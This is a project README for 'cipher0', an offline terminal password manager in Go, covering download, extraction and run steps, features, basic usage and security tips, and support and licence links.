---
layout: "default"
title: "🔐 cipher0 - Secure Your Passwords with Ease"
description: "🔒 Securely manage passwords offline with cipher0, a TUI password manager featuring TOTP support and robust encryption built in Go."
---
# 🔐 cipher0 - Secure Your Passwords with Ease

## 🚀 Getting Started

Welcome to cipher0! This is your go-to offline-first terminal utility password manager. With support for TOTP, AES-256 encryption, and OS keyring integration, you can manage your passwords securely and conveniently. Follow the steps below to get started.

## 📥 Download Link

[![Download cipher0](https://img.shields.io/badge/Download-cipher0-blue?style=for-the-badge&logo=github)](https://github.com/Mohamad138345/cipher0/releases)

## 💾 System Requirements

- **Operating System:** Windows, macOS, or Linux
- **Memory:** At least 1 GB RAM
- **Disk Space:** 100 MB available storage
- **Go Runtime:** Version 1.14 or later (if compiling from source)

## 🛠️ Installation Steps

1. **Visit the Releases Page**  
   To download the latest version of cipher0, [visit this page to download](https://github.com/Mohamad138345/cipher0/releases). 

2. **Choose Your Version**  
   On the Releases page, you will see a list of available versions. Select the most recent release for your operating system.

3. **Download the File**  
   Click on the appropriate download link based on your operating system. This file will usually be named like `cipher0-windows.zip`, `cipher0-macos.zip`, or `cipher0-linux.tar.gz`. Save the file to a location you can easily access.

4. **Extract the Files**  
   After downloading, locate the downloaded file:
   - **Windows:** Right-click on the `.zip` file and select "Extract All".
   - **macOS & Linux:** Open the terminal and run the following command (`yourfile` is the name of the downloaded file):
     ```
     tar -xzvf yourfile.tar.gz
     ```
   
5. **Run the Application**  
   Navigate to the folder where you extracted the files. Use the following command to run the application:
   - **Windows:** Double-click `cipher0.exe`.
   - **macOS:** Open the terminal and run:
     ```
     ./cipher0
     ```
   - **Linux:** Open the terminal and run:
     ```
     ./cipher0
     ```

## 🔑 Features

- **Offline-First:** Access your passwords without needing an internet connection.
- **TOTP Support:** Generate time-based one-time passwords for enhanced security.
- **AES-256 Encryption:** Your password data remains secure with state-of-the-art encryption.
- **OS Keyring Integration:** Safely store your passwords in your operating system's keyring.

## 🖥️ User Interface

cipher0 provides a clean terminal-based user interface. Once you run the application, you will see a simple menu that allows you to manage, add, or retrieve your passwords easily.

## 📜 Usage Instructions

### Adding a Password

1. Select the option to add a new password.
2. Enter your website or service name.
3. Type your username or email associated with the account.
4. Enter your password.
5. Confirm and save the entry.

### Retrieving a Password

1. Select the option to view your stored passwords.
2. Search by the service name.
3. View or copy your password as needed.

### Managing TOTP

If you are using services that support TOTP, you can add your secret key to generate these passwords. When you select the TOTP option, you will simply enter your key, and the application will show the current code.

## 🛡️ Security Practices

- Always use strong, unique passwords for each account.
- Enable two-factor authentication where possible.
- Regularly update your passwords and audit your stored entries within cipher0.
- Backup your encrypted password data if you plan to switch devices or reinstall the software.

## 🤝 Support

If you encounter problems or have questions, feel free to check the Issues section of the [GitHub repository](https://github.com/Mohamad138345/cipher0/issues). You can report issues or request new features from there.

For further assistance, consider joining our community chat or checking documentation for troubleshooting tips and detailed usage.

## 📑 License

cipher0 is released under the MIT License. You can freely use, modify, and distribute the software under the terms of the license.

## 📍 Additional Resources

- For detailed documentation, navigate to our [Documentation](https://github.com/Mohamad138345/cipher0/wiki).
- To contribute to cipher0, visit our [Contributing Guide](https://github.com/Mohamad138345/cipher0/blob/main/CONTRIBUTING.md).

Thank you for choosing cipher0! We hope it helps you manage your passwords efficiently and securely.